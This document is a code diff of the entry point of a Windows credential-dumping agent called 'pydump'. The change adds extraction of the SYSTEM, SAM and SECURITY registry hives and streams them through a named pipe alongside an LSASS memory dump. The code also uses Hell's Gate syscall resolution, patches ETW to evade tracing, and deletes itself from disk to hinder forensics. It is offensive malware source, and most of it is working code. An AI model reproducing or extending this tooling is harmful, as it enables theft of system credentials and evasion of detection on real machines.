@@ -2,18 +2,21 @@
  * pydump agent — entry point.
  *
  * Usage: agent.exe <LSASS_PID> <PIPE_NAME>
+ *   PID > 0: extract registry hives + dump LSASS memory
+ *   PID = 0: extract registry hives only
  *
- * 1. Resolves syscall numbers from ntdll (Hell's Gate, hash-based)
- * 2. Opens LSASS by PID
- * 3. Creates a named pipe (\\.\pipe\<PIPE_NAME>)
- * 4. Streams the LSASS dump in MiniDump format through the pipe
- * 5. Deletes itself from disk (ADS rename technique)
- * 6. Exits cleanly
+ * Protocol (on the named pipe):
+ *   "PYD\x01"                          magic (4 bytes)
+ *   <u32 size><data>                   SYSTEM hive
+ *   <u32 size><data>                   SAM hive
+ *   <u32 size><data>                   SECURITY hive
+ *   <remaining bytes until close>      LSASS MDMP (if PID > 0)
  */
 
 #include <windows.h>
 #include "../include/syscalls.h"
 #include "../include/agent.h"
+#include "../include/registry.h"
 
 // Simple wide-string to int
 static DWORD wtoi(const wchar_t *s) {
@@ -96,7 +99,7 @@ void main_entry(void) {
     while (*end && *end != L' ' && *end != L'\r' && *end != L'\n') end++;
     *end = L'\0';
 
-    if (pid == 0 || pipe_name[0] == L'\0') {
+    if (pipe_name[0] == L'\0') {
         ExitProcess(1);
     }
 
@@ -108,19 +111,34 @@ void main_entry(void) {
     // Step 2: Patch ETW to prevent tracing
     patch_etw();
 
-    // Step 3: Create named pipe and wait for orchestrator
+    // Step 3: Load advapi32 for registry operations
+    if (!init_registry()) {
+        ExitProcess(2);
+    }
+
+    // Step 4: Create named pipe and wait for orchestrator
     HANDLE pipe = open_named_pipe(pipe_name);
     if (!pipe) {
         ExitProcess(3);
     }
 
-    // Step 4: Dump LSASS and stream through pipe
-    BOOL success = dump_lsass(pid, pipe);
+    // Step 5: Write protocol header
+    BYTE magic[4] = {'P', 'Y', 'D', 0x01};
+    write_pipe(pipe, magic, 4);
 
-    // Step 5: Cleanup
+    // Step 6: Save and send registry hives (SYSTEM, SAM, SECURITY)
+    dump_registry_hives(pipe);
+
+    // Step 7: Dump LSASS if PID was provided
+    BOOL success = TRUE;
+    if (pid > 0) {
+        success = dump_lsass(pid, pipe);
+    }
+
+    // Step 8: Cleanup
     close_pipe(pipe);
 
-    // Step 6: Self-delete from disk (anti-forensics)
+    // Step 9: Self-delete from disk (anti-forensics)
     self_delete();
 
     ExitProcess(success ? 0 : 4);
